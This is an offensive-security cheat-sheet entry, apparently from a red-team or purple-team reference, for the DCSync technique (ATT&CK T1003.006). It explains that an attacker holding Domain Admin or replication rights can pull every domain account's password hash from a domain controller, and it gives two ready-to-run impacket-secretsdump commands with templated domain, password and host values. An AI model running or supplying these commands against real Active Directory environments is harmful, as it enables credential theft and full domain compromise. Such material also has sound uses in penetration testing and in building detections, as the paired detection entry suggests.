---
id: dcsync-secretsdump
title: DCSync — dump domain hashes via replication
section: Active Directory — attack paths
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1003.006]
platform: [windows, network]
source: hacktheplanet §"Active Directory — attack paths"
pair: dcsync-4662
---

Once you hold DA or an account with the replication rights (DS-Replication-Get-Changes
+ -All), pull the whole directory's hashes without touching a DC's disk. `-just-dc`
limits it to the domain accounts.

```sh
impacket-secretsdump {{domain}}/Administrator:{{password}}@{{rhost}}
impacket-secretsdump -just-dc {{domain}}/Administrator:{{password}}@{{rhost}}
```
